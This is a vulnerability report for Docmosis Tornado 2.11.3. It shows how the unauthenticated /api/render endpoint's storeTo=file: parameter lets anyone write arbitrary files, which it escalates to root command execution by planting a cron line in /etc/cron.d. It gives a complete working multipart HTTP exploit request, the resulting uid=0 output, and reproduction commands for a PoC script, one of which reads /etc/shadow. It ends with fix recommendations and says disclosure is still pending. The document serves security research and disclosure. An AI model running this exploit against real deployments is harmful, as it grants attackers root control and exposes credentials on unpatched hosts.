# Docmosis Tornado — Unauthenticated Arbitrary File Write to Root RCE (storeTo=file: → cron)

## 1. Product & Attack Surface

Docmosis Tornado 2.11.3 is a Java/Tomcat document-generation service (executable `.war`, embedded Tomcat) exposing a Jersey REST API at `/api/*`. In a default local (on-prem) deployment it listens on `127.0.0.1:8090` (configurable to public) and the service starts as `root` (`launch.sh: java -jar ... &`).

## 2. Authentication Boundary (empirically verified)

An `AuthenticatedCheckFilter` exists, but its logic treats all `/api` paths as REST calls and skips the session-authentication branch:

```java
isRestCall = req.getServletPath().equals("/api")
// auth block only runs inside: if (!authenticated && !isRestCall)
```

The `accessKey` check (`RenderRestfulService.validateAccess`, line 550): local deployment `WebServerContext.isCloud()=false` skips the cloud branch; `getAccountEnvironment(accessKey).isAccessible()` returns true for empty/default access keys.

Dynamic verification: `POST /api/render` and `POST /api/convert` without an access key reach business logic (parameter-validation errors or successful conversion), not authentication errors → **all `/api/*` endpoints are anonymously reachable in local deployments**.

## 3. Sink: G.java (file destination handler)

The `/api/render` endpoint accepts a `storeTo` form parameter. A destination dispatcher (`_.java`) routes by prefix — `file:` → `G`, `mailto:` → mail, `s3:` → S3, `stream:` → response stream.

`G.java` core sink:

```java
private static final boolean G = DMProperties.getBoolean(
    "docmosis.storage.allowLocalFileOverwrite", false);   // line 38, default false

if (WebServerContext.isCloud()) { ... return; }          // cloud-mode block (not active locally)

String string2 = this.E;          // attacker-controlled path after "file:"
File file = c.B();                // rendered document (temp file)
object = new File(string2);       // attacker path used directly, no canonicalization
if (!G && ((File)object).exists()) {
    // only errors if overwrite protection is on AND the file already exists
}
FileUtilities.copyFile((File)file, (File)object);        // write rendered doc to arbitrary path
```

Key flaw: `object = new File(string2)` uses the attacker path with no canonicalization, no `..` traversal check, and no directory whitelist. The only restriction `allowLocalFileOverwrite` (default false) merely prevents overwriting an existing file — new files can be written anywhere. The `isCloud()` gate only blocks cloud mode; local (on-prem, Tornado default) deployments are exploitable.

## 4. Source: storeTo form parameter

`storeTo` is a direct `@FormParam` of `RenderRestfulService.render` (line 174), fully attacker-controlled. It passes through `RestUtils.sanitize` (trim only, no path sanitization) into the rendering pipeline and finally reaches the destination dispatcher `_.java:91: return new G(..., string)`, where `this.E` is the attacker path.

## 5. Data Flow

```
Attacker POST /api/render (anonymous)
  ├─ storeTo=file:/etc/cron.d/docmosis_rce
  ├─ outputFormat=txt
  ├─ templateName=WelcomeTemplate.docx      (template contains a message text field)
  ├─ data={"message":"* * * * * root id > /tmp/proof 2>&1"}
  └─ outputName=rce_cron.txt
       │
       ▼ RenderRestfulService.render (validateAccess passes: isCloud()=false, empty key accessible)
       │
       ▼ Render: template message field ← data.message; LibreOffice TEXT exporter outputs raw text
       │
       ▼ Destination dispatch: _.java "file:" prefix → new G(...)
       │
       ▼ G.A(): new File("/etc/cron.d/docmosis_rce") (no validation)
       │        allowLocalFileOverwrite=false && file absent → not blocked
       │
       ▼ FileUtilities.copyFile(rendered doc, /etc/cron.d/docmosis_rce)  ← write
       │
       ▼ crond reads /etc/cron.d/docmosis_rce, executes the cron line (root)
       │
       ▼ uid=0 (root)
```

## 6. Why cron Path Works

1. `outputFormat=txt` → LibreOffice TEXT exporter writes template content verbatim (no escaping of special characters).
2. Template `WelcomeTemplate.docx` contains a `message` text field; `data.message` is rendered verbatim on its own line.
3. `/etc/cron.d/` files are parsed by crond: non-cron-format lines are logged as "bad minute" and skipped, but valid cron lines execute. The rendered output (static template header text + one valid cron line) functions as a valid cron file.
4. The cron line `* * * * * root <cmd>` runs as root; both the service and crond run as root → root arbitrary command execution.

## 7. Excluded Attack Vectors (9 side channels, statically/dynamically verified unreachable)

The following alternate paths were tested and ruled out:

- `jeval` to RCE: no reflection/exec sink reachable
- `/render` outputName webroot write: output streams back to the response, not to disk
- Template upload: no `/uploadTemplate` endpoint in local deployment
- `templateName` path traversal: canonicalized + `startsWith` check
- `devMode`: fault-tolerance only, no RCE
- `isSystemTemplate`: only locks registration
- `/convert` macro execution: LibreOffice default macro security is Medium; empirically no marker
- `/convert` outputName filesystem write: empirically no traversal marker file created
- `/render` macro execution: same as `/convert`

`outputName` does not participate in local-path resolution: it only names the HTTP response attachment (streamed back to the response). The local destination is fully determined by `storeTo=file:<path>`.

## 8. Dynamic Verification

### 8.1 Environment

- Deployment: Docmosis Tornado 2.11.3 executable WAR (embedded Tomcat), launched via `launch.sh` as root, listening on 127.0.0.1:8090, LibreOffice 7.1.8.1 headless.
- crond: running (systemd crond active).

### 8.2 Request (anonymous, no accessKey, no cookie)

```
POST /api/render HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: multipart/form-data; boundary=----docmosis_poc_boundary

------docmosis_poc_boundary
Content-Disposition: form-data; name="templateName"

WelcomeTemplate.docx
------docmosis_poc_boundary
Content-Disposition: form-data; name="outputName"

poc.txt
------docmosis_poc_boundary
Content-Disposition: form-data; name="outputFormat"

txt
------docmosis_poc_boundary
Content-Disposition: form-data; name="storeTo"

file:/etc/cron.d/docmosis_poc_<nonce>
------docmosis_poc_boundary
Content-Disposition: form-data; name="data"

{"date":"x","message":"* * * * * root sh -c 'id > <webroot>/poc_out_<nonce>.txt 2>&1'"}
------docmosis_poc_boundary--
```

### 8.3 Response

```
HTTP/1.1 200 OK
{"succeeded":true}
```

After ~70s, crond triggers:

```
(root) CMD (sh -c 'id > <webroot>/poc_out_<nonce>.txt 2>&1')
```

Fetching the command output:

```
GET /poc_out_<nonce>.txt HTTP/1.1
HTTP/1.1 200
uid=0(root) gid=0(root) groups=0(root)
```

→ root RCE confirmed.

## 9. Reachability

- Authentication: `/api/*` anonymously reachable in local deployments (see section 2), no credentials required.
- Path: `storeTo=file:<any path>` has no validation; can write `/etc/cron.d/`, webapp ROOT, `/etc/cron.hourly/`, and any writable directory.
- Execution: crond runs by default; `/etc/cron.d/` files are parsed every minute; valid cron lines execute as the file owner/specified user (root here).
- Privilege: service root → crond root → command root.
- Config prerequisites: local (on-prem) deployment (Tornado default, not cloud); `allowLocalFileOverwrite` default false only blocks overwriting existing files (writing new files is unrestricted); crond running. All default configuration.

## 10. Impact & Fix Recommendations

**Impact**: Unauthenticated arbitrary file write on the host; via `/etc/cron.d/` achieves root command execution. The service runs as root by default, and local deployments are exposed without authentication.

**Fix recommendations**:
1. Enforce authentication for all `/api/*` endpoints (change `AuthenticatedCheckFilter.isRestCall` from `equals("/api")` to enforce accessKey for `/api/*`; `validateAccess` must return false for empty access keys)
2. Canonicalize `storeTo` paths and enforce a strict destination directory whitelist (restrict to the `docmosis.storage.dir` subtree; reject `..` and out-of-bounds absolute paths)
3. Change `allowLocalFileOverwrite` semantics: local file destinations should only allow the configured output directory, not arbitrary paths
4. Run Tornado as an unprivileged service account, not root
5. Restrict the service to trusted networks; never expose it to the public Internet

## 11. Key Code Locations

| File | Line | Content |
|------|------|---------|
| `G.java` | 38 | `allowLocalFileOverwrite` default false |
| `G.java` | 56 | `isCloud()` gate (not active locally) |
| `G.java` | ~84-110 | `new File(string2); copyFile(file, object)` — sink, no validation |
| `_.java` | 36/91 | `"file"` constant + `new G(...)` dispatch |
| `RenderRestfulService.java` | 174 | `@FormParam("storeTo")` source |
| `RenderRestfulService.java` | 550-613 | `validateAccess` local empty-accessKey pass |

## 12. Reproduction

```bash
# Upload the PoC script to the target host (same host as the service; crond must run)
python3 docmosis_storeto_file_rce.py 127.0.0.1 8090 "id"
# Expected: ~70s later output uid=0(root)
python3 docmosis_storeto_file_rce.py 127.0.0.1 8090 "cat /etc/shadow" \
  --webapp-root <PATH_TO_WEBAPP_ROOT>
```

## 13. Timeline & Disclosure Status

- Research completed and dynamically verified: 2026-08
- Vendor notification, CVE, and public disclosure channels: pending operator approval (Batch #6)
